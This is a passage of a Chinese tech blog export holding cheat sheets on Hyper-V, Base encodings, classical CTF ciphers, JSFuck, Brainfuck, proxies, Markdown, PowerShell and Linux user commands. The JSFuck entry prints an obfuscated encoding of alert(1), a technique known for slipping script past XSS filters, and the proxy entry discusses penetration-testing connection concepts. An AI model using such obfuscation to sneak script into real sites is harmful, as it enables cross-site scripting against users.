    <content type="text"><![CDATA[全屏问题由于Hyper-V最初是为服务器设计的，所以到目前为止，Hyper-V对于全屏的支持没有VMware做得好，同样，Hyper-V也不能像VMware那样随意更改窗口大小，这多少显得很不方便。对于Windows虚拟机的全屏操作，目前较为理想的解决方案是使用远程桌面连接，记得要在虚拟机中开启远程桌面连接功能；而对于Linux虚拟机的全屏操作，可以通过修改/etc/default/grub文件，更改其中GRUB_CMDLINE_LINUX_DEFAULT=&quot;quiet splash video=hyperv_fb:1920x1080&quot;（注意是x不是*），接着执行update-grub并重启即可。 显卡问题开启Hyper-V功能后，原主机的显卡可能会出现问题，对于我的1803版Win10来说，电脑中原来的Intel(R) HD Graphics 4600核芯显卡（针对我的电脑而言）不能正常工作，具体表现在工具栏中英特尔核芯显卡控制面板图标消失，以及系统设置中莫名出现多个显示器，最直观的感受是每当点亮屏幕，图像显示会变慢，并且有一个逐渐适配屏幕大小的过程。究其原因是系统中原本的4624版驱动程序与Hyper-V不兼容，解决办法是去官网下载最新版驱动程序并升级即可。 兼容性问题由于Hyper-V采用的是硬件虚拟化技术，所以开启Hyper-V功能后相当于原本的物理机也运行在虚拟化上了，因此不能再使用VMware或者VirtualBox，它们不允许在虚拟机上运行虚拟机，而此时原主机在它们眼中就是一个虚拟机。早期的Android Studio中自带的模拟器也会由于这种原因导致模拟器无法启动，只需将模拟器升级到最新版即可解决，Android Studio 3.1.4版之后自带模拟器(v27.3.9)已经可以支持Hyper-V，在开启Hyper-V的系统中，它使用Windows虚拟机监控程序平台替代了Intel的HAXM，使用前需要在Windows功能中启用Windows虚拟机监控程序平台功能。 网卡问题要想使Hyper-V中的虚拟机上网，可以通过创建虚拟交换机实现，虚拟交换机有3种类型，外部相当于VMware的桥接模式，内部相当于VMware的NAT模式，专用相当于VMware的仅主机模式，所有虚拟机会默认使用内部类型的默认交换机，这是虚拟交换机管理器自动创建的。如果我们选择创建外部类型的虚拟交换机，则会把Hyper-V的网络桥接在物理网卡上，那物理网卡将变成一个虚拟交换机。因此我们会发现原来使用的网卡变成了vEthernet，这是正常现象，不用担心。Hyper-V会自动创建一个虚拟网卡来继承原物理网卡的配置，物理计算机可以正常使用网络。 代数问题在创建虚拟机时可以选择虚拟机代数，简单来说，第一代虚拟机支持创建32位与64位操作系统，创建的虚拟硬盘为.vhd格式，第二代虚拟机只能创建64位操作系统，创建的虚拟硬盘为.vhdx格式，并且必须是Windows 8或者Windows Server 2012以上版本，对于Linux，微软官方有一份详细的清单表明哪些版本可以创建第二代虚拟机。为方便起见，可以在首次创建时选择第二代虚拟机，若不能成功启动，且屏幕显示No operating system was loaded. Press a key to retry the boot sequence...信息，则可以在设置中关闭安全启动并重启虚拟机，或者删掉虚拟机并重新创建第一代虚拟机。]]></content>
      <categories>
        <category>Bug</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Base编码家族]]></title>
    <url>%2F2018%2F08%2F10%2Fbase%2F</url>
    <content type="text"><![CDATA[Base64Base64，顾名思义是一种基于64个可打印字符来表示二进制数据的表示方法，这64个字符分别为A-Z、a-z、0-9以及+与/。64个字符可用6个比特位表示，3个字节有24个比特位，对应于4个Base64单元，所以编码后的数据要比原始数据略长，为原来的4/3。Base64索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 A 16 Q 32 g 48 w 1 B 17 R 33 h 49 x 2 C 18 S 34 i 50 y 3 D 19 T 35 j 51 z 4 E 20 U 36 k 52 0 5 F 21 V 37 l 53 1 6 G 22 W 38 m 54 2 7 H 23 X 39 n 55 3 8 I 24 Y 40 o 56 4 9 J 25 Z 41 p 57 5 10 K 26 a 42 q 58 6 11 L 27 b 43 r 59 7 12 M 28 c 44 s 60 8 13 N 29 d 45 t 61 9 14 O 30 e 46 u 62 + 15 P 31 f 47 v 63 / 编码Hello的过程如下： 文本 H e l l o ASCII编码 72 101 108 108 111 二进制位 ‭01001000‬ ‭01100101‬ ‭01101100‬ ‭01101100‬ ‭01101111‬ 00000000 以6个二进制位进行编码： 二进制位 010010 000110 010101 101100 011011 000110 111100 000000 索引 18 6 21 44 27 6 60 Base64编码 S G V s b G 8 = 若原数据不是3的倍数，且多出1个字节，则在编码末尾加2个=，多出2个字节，则在编码末尾加1个=。换言之，若多出1个字节，则最后一个6位的Base64字节块有4位是0值，若多出2个字节，则最后一个6位的Base64字节块有2位是0值。 Base32与上类似，Base32基于32个可打印字符，分别为A-Z以及2-7。32个字符可用5个比特位表示，5个字节有40个比特位，对应于8个Base32单元，编码后的数据比原始数据略长8/5。若原数据不是5的倍数，且多出1个字节，则在编码末尾加4个=，多出2个字节，则在编码末尾加3个=，多出3个字节，则在编码末尾加2个=，多出4个字节，则在编码末尾加1个=。Base32索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 A 8 I 16 Q 24 Y 1 B 9 J 17 R 25 Z 2 C 10 K 18 S 26 2 3 D 11 L 19 T 27 3 4 E 12 M 20 U 28 4 5 F 13 N 21 V 29 5 6 G 14 O 22 W 30 6 7 H 15 P 23 X 31 7 Base16与上类似，Base16基于16个可打印字符，分别为0-9以及A-F。16个字符可用4个比特位表示，1个字节有8个比特位，对应于2个Base16单元，编码后的数据比原始数据略长2。显然，在Base16中不需要在末尾填充=。Base16索引表如下所示： 数值 字符 数值 字符 数值 字符 数值 字符 0 0 4 4 8 8 12 C 1 1 5 5 9 9 13 D 2 2 6 6 10 A 14 E 3 3 7 7 11 B 15 F XXencodeXXencode不属于Base编码家族，但与Base64编码极为类似，区别仅在于64个可打印字符及其顺序，XXencode使用的为+、-、0-9、A-Z、a-z。 UUencodeUUencode也与Base64极为类似，它使用的字符及其顺序为(space)、!、&quot;、#、$、%、&amp;、&#39;、(、)、*、+、,、-、.、/、0-9、:、;、&lt;、=、&gt;、?、@、A-Z、[、\、]、^、_、`。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[古典密码学]]></title>
    <url>%2F2018%2F08%2F10%2Fclassical-crypto%2F</url>
    <content type="text"><![CDATA[密码学（Cryptography）大致可分为古典密码学（Classic cryptography）和现代密码学（Modern cryptography），两者的主要差别在于计算机的使用，一般来说，古典密码学是基于字符的，而现代密码学是基于二进制位的。古典密码学主要包括两类，即代换和置换。 代换代换密码是将明文中的字符替代成其他字符，即替代转换，若整个加密过程中每个字符采用同一张表替代，则为单表代换密码，类似的，若整个加密过程中每个字符采用不同的表替代，则为多表代换密码，典型的单表代换密码有凯撒密码、培根密码等，多表代换密码有维吉尼亚密码等。 凯撒密码凯撒密码(Caesar cipher)就是将明文中的所有字母都在字母表上向后(或向前)按照一个固定数目进行偏移后被替换成密文。例如，当偏移量为3时，所有的字母A将被替换成D，B变成E，以此类推。明文Hello World的加密过程如下： 取偏移量为3 计算H的后3位为K 以此类推 密文为：Khoor Zruog 类似的，解密过程如下： 计算K的前3位为H 以此类推 明文为：Hello World 注意：当偏移量为13时，这种凯撒密码的特例又被称为ROT13(回转13位)加密，ROT13加密是一种对等加密(Reciprocal cipher)，对等加密是对称加密的一个特例，即该类密码的加密算法是它自己本身的逆反函数，换言之，要对其解密，只需对其密文再次套用加密算法即可。当偏移量未知时，可采用穷举法一个个试，偏移量必定小于26。 培根密码培根密码(Bacon’s cipher)加密时，明文中的每个字母都会转换成一组5个英文字母。其转换依靠下表： 明文 密文 明文 密文 明文 密文 明文 密文 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 按照上表，明文hello的密文为AABBBAABAAABABBABABBABBBA，显然，密文的长度是明文长度的5倍。除了上表用来加密小写明文外，还有一张用来加密大写明文的表，如下： 明文 密文 明文 密文 明文 密文 明文 密文 明文 密文 A aaaaa G aabba M abbaa S baaba Y bbaaa B aaaab H aabbb N abbab T baabb Z bbaab C aaaba I abaaa O abbba U babaa D aaabb J abaab P abbbb V babab E aabaa K ababa Q baaaa W babba F aabab L ababb R baaab X babbb 同理，明文HELLO的密文为aabbbaabaaababbababbabbba。注意：虽然表中出现了A B两种字符，但培根密码的本质是二进制，即用两种不同的特征来加密明文，可以是字母的大小写或字体的样式等等。例如采用字母的大小写加密hello为GOod gOOd STUdY, dAY dAy UP, haHa，其中大写代表A，小写代表B；类似的，也可以用粗体代表A，正常代表B，以字体的样式加密hello。显然，培根密码所包含的信息可以和用于承载其的文章完全无关。 维吉尼亚密码维吉尼亚密码是使用一系列凯撒密码组成密码字母表的加密算法，用来加解密的维吉尼亚表格如下所示：这一表格包括了26行字母表，每一行都由前一行向左偏移1位得到。行为明文行，列为密钥列，密文位于表格内。明文HELLOWORLD的加密结果如下： 选择某一关键词作为密钥，如SECRET 对于明文第1个字母H，对应密钥的第1个字母S，于是使用表格中S行字母表进行加密，得到密文第一个字母Z 以此类推，若密钥长度小于明文长度，则转到密钥第1个字母继续循环，最终得到密文ZINCSPGVNU 类似的，解密过程如下： 根据密钥第1个字母S所对应的S行字母表，发现密文第1个字母Z位于H列，因而明文第1个字母为H 依次类推 显而易见，维吉尼亚密码相对于本文介绍的其他古典密码，很难利用穷举法破解。 置换置换密码是将明文中的字母重新排列，字母本身不变，但其位置改变，即位置转换，典型的有栅栏密码等。 栅栏密码栅栏密码(Rail fence cipher)，又称篱笆密码，就是把要加密的明文分成n个一组，然后把每组的第一个字连起来，紧接着把每组的第二个字连起来，以此类推，形成一段无规律的话。明文Hello World的加密过程如下： 去掉空格：HelloWorld 5个一组：Hello，World 取出每组第1个字母：HW 取出每组第2个字母：eo 以此类推 连在一起：HWeolrllod 加上适当空格：HWeol rllod 类似的，解密过程如下： 去掉空格：HWeolrllod 分成5栏：HW、eo、lr、ll、od 取出每栏第1个字母：Hello 依次类推 连在一起：HelloWorld 加上适当空格：Hello World 注意：这里栅栏的栏数取决于n的取值，一般而言，n要整除字母数，n不可能大于或等于字母数，当不知道n为多少时，可采用穷举法一个个试。 其他当铺密码准确来说，当铺密码不是一种加密方式而是一种编码方式，它是将中文和数字进行转化的算法，具体为：当前汉字有多少笔画出头，就转化成数字几。如王夫 井工 夫口 由中人即为67 84 70 123。 猪圈密码猪圈密码(Pigpen cipher)，又称共济会密码(Masonic cipher)，是一种以格子为基础的简单代换式密码。下图为猪圈密码中所用符号与26个英语字母之间的对应关系：明文X MARKS THE SPOT的加密结果如下： 变形猪圈密码还有一种变形，即采用图片中字符位置一一对应的形式加解密，如FLAG可加密为OCJP。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JSFuck]]></title>
    <url>%2F2018%2F08%2F10%2Fjsfuck%2F</url>
    <content type="text"><![CDATA[JSFuck是一种JavaScript的编码方式，它的命名起源于Brainfuck，同样，为了避讳脏话，它又被写作JSF*ck，以JSFuck风格写出的代码不需要另外的编译器或解释器执行，原生的JavaScript解释器即可直接运行。JSFuck种共使用[、]、(、)、!、+这6种字符。alert(1)这段JavaScript代码用JSFuck风格表示如下所示：1[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])() 要将任意的JavaScript代码编码为JSFuck风格，可前往JSFuck。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Brainfuck]]></title>
    <url>%2F2018%2F08%2F09%2Fbrainfuck%2F</url>
    <content type="text"><![CDATA[Brainfuck是在1993年创建的一种极小化的计算机语言，由于fuck在英语中是脏话，这种语言有时也被称为Brainf*ck或Brainf***，或被简称为BF。Brainfuck中共有8种字符，它们及其含义如下所示： &gt;：指针加一 &lt;：指针减一 +：指针指向的字节的值加一 -：指针指向的字节的值减一 .：输出指针指向的单元内容(ASCII码) ,：输入内容到指针指向的单元(ASCII码) [：如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ]：如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 下面是一个用Brainfuck在屏幕上打印Hello World的程序例子：123++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-]&gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++.&gt;.+++.------.--------.&gt;+.&gt;. 程序的运行结果如Brainfuck Visualizer所示。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[《TAOUP》读书笔记]]></title>
    <url>%2F2018%2F08%2F02%2Ftaoup%2F</url>
    <content type="text"><![CDATA[我没有写错，本文所记述的不是Knuth的那本举世瞩目的TAOCP(计算机程序设计艺术)，而是ESR所写的TAOUP，即The Art of UNIX Programming(UNIX编程艺术)。 哲学Unix的设计哲学总体上可以概括为以下几点： 模块原则：使用简洁的接口拼合简单的部件 清晰原则：清晰胜于机巧 组合原则：设计时考虑拼接组合 分离原则：策略同机制分离，接口同引擎分离 简洁原则：设计要简洁，复杂度能低则低 吝啬原则：除非却无它法，不要编写庞大的程序 透明性原则：设计要可见，以便审查和调试 健壮原则：健壮源于透明与简洁 表示原则：把知识叠入数据以求逻辑质朴而健壮 通俗原则：接口设计避免标新立异 缄默原则：如果一个程序没什么好说的，就沉默 补救原则：出现异常时，马上退出并给出足够错误信息 经济原则：宁花机器一分，不花程序员一秒 生成原则：避免手工hack，尽量编写程序去生成程序 优化原则：雕琢前先要有原型，跑之前先学会走 多样原则：决不相信所谓“不二法门”的断言 扩展原则：设计着眼未来，未来总比预想来得快 所有的Unix哲学浓缩为一条铁律就是KISS原则，即Keep It Simple, Stupid！]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于代理那些事]]></title>
    <url>%2F2018%2F07%2F26%2Fabout-proxy%2F</url>
    <content type="text"><![CDATA[正向连接与反向连接正向连接即黑客主动连接受害者，这种情况下要求受害者有公网IP，常用于对服务器的渗透；反向连接即受害者主动连接黑客，这种情况下要求黑客有公网IP，常用于对个人的渗透。 正向代理与反向代理在英语中，Proxy表示服务器代理这种动作，而Agent表示代理服务器这种物质，显然，我们这里讨论的是Proxy这种动作，而非代理服务器本身。不论正向还是反向，代理都是基于这样一个事实：即A与B的通信要经过C的转发，这里的C就是Agent，为了方便讨论，我们将A视为客户端，将B视为服务器端。正向代理(Forward Proxy)：也就是常说的代理，代理服务器偏向于客户端，服务器端只能得到代理服务器的IP地址，隐藏了客户端的IP地址。常用于科学上网工具。反向代理(Reverse Proxy)：代理服务器偏向于服务器端，客户端只能得到代理服务器的IP地址，隐藏了服务器端的IP地址。常用于网站镜像等。 端口转发与端口映射传统意义上，我们认为端口转发(Port Forwarding)与端口映射(Port Mapping)表达同样的内容。顾名思义，端口转发指的是将某个IP的某个端口转发到另一个IP的另一个端口，这样，可以通过访问后者以达到访问前者的目的。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XML、JSON与YAML]]></title>
    <url>%2F2018%2F07%2F21%2Fxml-json-yaml%2F</url>
    <content type="text"><![CDATA[XML、JSON与YAML是三种常见的信息标记形式，这三者由于其特有的属性而在不同的领域广为使用。 XMLXML，Extensible Markup Language(可扩展标记语言)，倘若我要表示某个人的简要信息，用XML可写为：12345678910&lt;person&gt; &lt;firstName&gt;Tian&lt;/firstName&gt; &lt;lastName&gt;Song&lt;/lastName&gt; &lt;address&gt; &lt;streetAddr&gt;中关村南大街5号&lt;/streetAddr&gt; &lt;city&gt;北京市&lt;/city&gt; &lt;zipcode&gt;100081&lt;/zipcode&gt; &lt;/address&gt; &lt;prof&gt;Computer System&lt;/prof&gt;&lt;prof&gt;Security&lt;/prof&gt;&lt;/person&gt; JSONJSON，JavaScript Object Notation(JavaScript对象表示法)，倘若我要表示某个人的简要信息，用JSON可写为：12345678910&#123; &quot;firstName&quot; : &quot;Tian&quot;, &quot;lastName&quot; : &quot;Song&quot;, &quot;address&quot; : &#123; &quot;streetAddr&quot; : &quot;中关村南大街5号&quot;, &quot;city&quot; : &quot;北京市&quot;, &quot;zipcode&quot; : &quot;100081&quot; &#125;, &quot;prof&quot; : [&quot;Computer System&quot;, &quot;Security&quot;]&#125; YAMLYAML，在开发这种语言之初，其意为Yet Another Markup Language(仍是一种标记语言)，之后为了强调这种语言以数据作为中心，而不是以标记语言为重点，故解释为YAML Ain’t a Markup Language(YAML不是一种标记语言)，倘若我要表示某个人的简要信息，用YAML可写为：123456789firstName : TianlastName : Songaddress : streetAddr : 中关村南大街5号 city : 北京市 zipcode : 100081prof : -Computer System-Security 比较XML是最早的通用信息标记语言，可扩展性好，但繁琐，主要用于Internet上的信息交互与传递，以及用户界面的编写，比如Android；JSON中的信息有类型，适合程序处理(js)，较XML简洁，主要用于移动应用云端和节点的信息通信，无注释；YAML信息无类型，文本信息比例最高，可读性好，主要用于各类系统的配置文件，有注释易读。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Markdown小记]]></title>
    <url>%2F2018%2F07%2F21%2Fmarkdown-cheatsheet%2F</url>
    <content type="text"><![CDATA[Markdown是一种轻量标记语言，其文件后缀名为.md，它允许人们采用其规定的语法编写文档，而后Markdown解析器会将其转化为有效的HTML文档，以便在网页中显示，时至今日，有许多Markdown解析器增强了Markdown的基本语法，这就造成了Markdown有多种风格（flavor）。因为Markdown要被转化为HTML才能在网页上显示，所以在Markdown中仍然可以使用HTML，如果有Markdown无法完成的工作，完全可以再用回HTML。 基本语法标题12# 一级标题#### 四级标题 对应HTML，最高6级标题。 列表123456789- 无序列表项 - 这是是嵌套列表项 - 这里也是嵌套列表项- 无序列表项- 无序列表项1. 有序列表项2. 有序列表项3. 有序列表项 无序列表项常以-或*起始，个人习惯使用-。 链接1[Howie&apos;s Blog](http://howiezhao.com) 超文本链接必须带http。 图片1![一张图片](/images/abc.jpg) 当图片无法显示时，则显示中括号中的语句。图片的路径为相对路径，即当前Markdown文件所在路径下的images中的abc.jpg。 字体123*斜体***粗体*****粗斜体*** 代码```这里是多行代码``` `这里是单行代码` 表格1234表头1 | 表头2--- | ---单元格1 | 单元格2单元格3 | 单元格4 上下应该各空一行 引用1&gt; 这是引用 横线1---- 这是一条水平区分线，用3个或以上的短横线表示，个人习惯使用4个短横线。 转义和传统编程语言一样，Markdown使用\转义以上特殊字符。 最佳实践 在特殊字符与要书写的文字之间加上空格 不同段之间加一空行 链接后加一个空格 GitHub Flavored MarkdownGitHub Flavored Markdown，简记为GFM，即GitHub风格的Markdown语法，是GitHub中编辑器使用的Markdown语法格式，略微区别于标准的Markdown语法，主要如下： 链接自动识别：GFM会自动为标准的URL加上链接 语法着色：在```后输入语言名称，即可着色，要查看支持的语言列表，请参考官方文档 删除线：使用~~表示删除线 任务列表：使用- [ ]或- [x]表示未勾选或已勾选的任务列表 Emoji：使用:EMOJICODE:可以显示Emoji表情，比如:+1:表示一个👍，要查看完整的Emoji编码，可参考Emoji cheat sheet 要了解GFM的更多特性，可以参考GitHub官方的文档。 更多Dillinger是一个在线的Markdown编辑器。Sublime Text拥有众多的Markdown插件，其中Markdown​Preview可以在浏览器中预览Markdown文件，而Markdown​Editing可以快速的编辑Markdown文件。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Udacity：Apollo起步学习笔记]]></title>
    <url>%2F2018%2F07%2F21%2Fudacity-apollo%2F</url>
    <content type="text"><![CDATA[本笔记记录自ud0419-无人驾驶第一课：从Apollo起步。 一、无人驾驶概览无人驾驶车的6个等级： 0级——基本等级：驾驶员是系统的唯一决策者。 1级——驾驶员辅助(Driver Assistance)：车辆为驾驶员提供转向或加速支持，驾驶员必须保持充分参与。 2级——部分自动化(Partial Automation)：车辆自动控制几项功能，如自动巡航控制和车道保持，但是驾驶员仍然必须执行自治系统处理的任何功能。 3级——有条件的自动化(Conditional Automation)：车辆自主驾驶，但驾驶员必须准备在必要的时候随时接管。 4级——高度自动化(No Human Interference)：车辆控制驾驶体验的所有面面，并且不期望驾驶员的介入，车辆可能根本没有方向盘或任何驾驶员控制装置，但是车辆可能被限制在某些区域，通常这被称为“地理围栏”，车辆可以在特定的地理围栏内完全自主的运行，但是在地理围栏之外，车辆不能自主操作，或者根本无法操作。 5级——完全自动化(Full Automation)：车辆可以在人类可以驾驶的任何地方完全自主地运行，在所有情况下应与人类驾驶员的水平一样高或比其更高。 无人驾驶车的5个核心部件： 计算机视觉(Computer Vision)：通过摄像头图像弄清楚我们周围的世界是怎样的。 传感器融合(Sensor Fusion)：合并来自其他传感器的数据，如激光和雷达，从而更加深入的了解我们周围的环境。 定位(Localization)：精确的确定我们在那个世界所处的位置。 路径规划(Path Planning)：绘制这个世界的路线，帮助我们到达我们想去的地方。 控制(Control)：为了让汽车沿着我们在路径规划期间建立的轨道。 Apollo技术框架包含的4个层面： 参考车辆平台 参考硬件平台 开源软件平台 云服务平台 二、高精度地图]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>无人驾驶</tag>
        <tag>Apollo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于PowerShell]]></title>
    <url>%2F2018%2F07%2F16%2Fabout-powershell%2F</url>
    <content type="text"><![CDATA[PowerShell是微软用来取代CMD的一个强大的Shell。 版本在不同版本的Windows中已经内置了不同版本的PowerShell，常见情况如下： Windows XP SP2 / Server 2003 SP1：PowerShell 1.0 Windows 7 / Server 2008：PowerShell 2.0，此版本包含了PowerShell ISE，即Integrated Scripting Environment(集成的脚本环境)，用来方便的编写PowerShell脚本。 Windows 8 / Server 2012：PowerShell 3.0，从此版本开始，PowerShell被集成进了WMF中，即Windows Management Framework(Windows管理框架)。 Windows 8.1 / Server 2012 R2：PowerShell 4.0 Windows 10：PowerShell 5.0，此版本的WMF包含了PowerShellGet，可用于在线下载、安装模块。 优势及劣势PowerShell相较于CMD的优势是不言而喻的，相较于Unix中的Shell，它的优势主要体现在2方面：面向对象特性以及与.NET的深度结合。劣势当然也有，相较于CMD，至今为止它的启动速度仍然较慢，相较于Unix中的Shell，它的生态环境还欠火候，可以期待未来有更多的人关注到PowerShell。 Cmdlets与pipelineCmdlets与pipeline是PowerShell中的两个核心概念， 常用命令PowerShell中的大多数常用命令都有对应于Linux中相关命令的别名，比如ls、mv、ps、cat、kill、wget、clear等，下面介绍的命令为PowerShell所不同于Linux中的命令。1234567891011121314151617181920212223242526272829# 查看PowerShell版本信息Get-Host# 查看帮助信息help# 查看所有已经设置的别名Get-Alias# 从powershellgallery.com下载安装第三方模块Install-Module# 导入模块，安装的模块需要先导入才能使用Import-Module# 卸载模块Uninstall-Module# 更新模块Update-Module# 列出已安装模块Get-InstalledModule# 查看PowerShellGet模块有哪些命令Get-Command -Module PowerShellGet# 升级帮助手册Update-Help 常用模块 posh-git：PowerShell中的Git增强模块 oh-my-posh：类似于oh-my-zsh PSReadline：一个增强的命令行编辑模块 windows-screenfetch：Windows下的screenfetch模块 Microsoft.PowerShell_profile.ps1和一般的Linux中的Shell一样，PowerShell也有一个配置文件，即Microsoft.PowerShell_profile.ps1，当PowerShell运行时会默认加载此配置文件中的设置。一般而言，用户级别的配置文件位于%HOMEPATH%\Documents\WindowsPowerShell下，当然，你也可以使用echo $profile命令查看具体的位置。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows10的传递优化]]></title>
    <url>%2F2018%2F07%2F16%2Fdelivery-optimization%2F</url>
    <content type="text"><![CDATA[为了方便快速的下载Windows更新，微软在Windows10中启用了一种新的更新机制，即传递优化(Delivery Optimization)，这本质上是一种P2P架构，换句话来说，倘若开启了传递优化功能，更新时将会额外的从别的已更新的且开启传递优化功能的电脑上下载，同时也会上传已更新的文件到需要更新的电脑上。值得注意的是，传递优化对局域网进行了特殊处理，即当局域网内一台电脑完成更新后，传递优化会使得此局域网内的其他电脑依次完成更新。开启或关闭传递优化的设置路径为：设置 ——&gt; 更新和安全 ——&gt; Windows更新 ——&gt; 高级选项 ——&gt; 传递优化。传递优化用于上传的文件路径位于：C:\Windows\Logs\dosvc。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[useradd与adduser]]></title>
    <url>%2F2018%2F07%2F16%2Fuseradd-adduser%2F</url>
    <content type="text"><![CDATA[在Linux中创建用户可以用useradd或者adduser，值得注意的是创建的用户并不一定可以登录，登录的用户肯定要有它的用户主目录、登录Shell等相关配置，而这两个命令之间的差异就在于此。 adduser当使用adduser howie命令时，系统除了创建howie用户，还会自动创建用户主目录、同名用户组、登录Shell等，并提示输入用户密码，这一切操作都将以一个对话的形式完成。 useradd当使用useradd howie命令时，系统只会创建howie用户，而不会创建用户密码、用户主目录、同名用户组、登录shell等，若要指定密码，可以接着采用passwd howie命令。其次，useradd有众多参数，我们可以通过使用这些参数来达到和adduser一样的效果，如useradd -d /home/howie -m -s /bin/bash howie，不过注意之后还得使用passwd命令创建密码，当然也可以使用-p参数直接设置密码，但这样会将密码直接显示在终端屏幕上，不安全。 userdel当使用userdel howie命令时，系统只会删除howie用户，并不会删除用户主目录以及用户邮箱目录，因此可以使用-r参数。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[云服务的三种模式]]></title>
    <url>%2F2018%2F07%2F15%2Fxaas%2F</url>
    <content type="text"><![CDATA[云服务的模式一般有IaaS、PaaS、SaaS三种，既然是云服务，也即我们不用购买真实的计算设备，所有的模式都是基于此之上的。 IaaSIaaS，Infrastructure as a Service(基础设施即服务)，云服务的最底层，服务商提供操作系统、存储设施、硬件配置等资源，典型的例子是VPS，即Virtual Private Server(虚拟专用服务器)，这类服务一般提供必要的Shell接口，可使用户连接到操作系统进行相关配置，常见的VPS厂商有Amazon EC2、阿里云 ECS等。 PaaSPaaS，Platform as a Service(平台即服务)，云服务的中间层，服务商提供必要的应用，用户无权访问操作系统及硬件等资源，典型的例子是虚拟空间，这类服务一般会提供必要的Web服务器、数据库等，用户可以直接在其上部署Web应用，我用过的虚拟空间有老薛主机，常见的PaaS厂商有Google App Engine(GAE)、Heroku等。 SaaSSaaS，Software as a Service(软件即服务)，云服务的最高层，直接提供现成的应用供用户使用，用户所付出的精力最少，例如本站采用的Hexo、WordPress等。]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[编译与构建]]></title>
    <url>%2F2018%2F07%2F15%2Fcompile-build%2F</url>
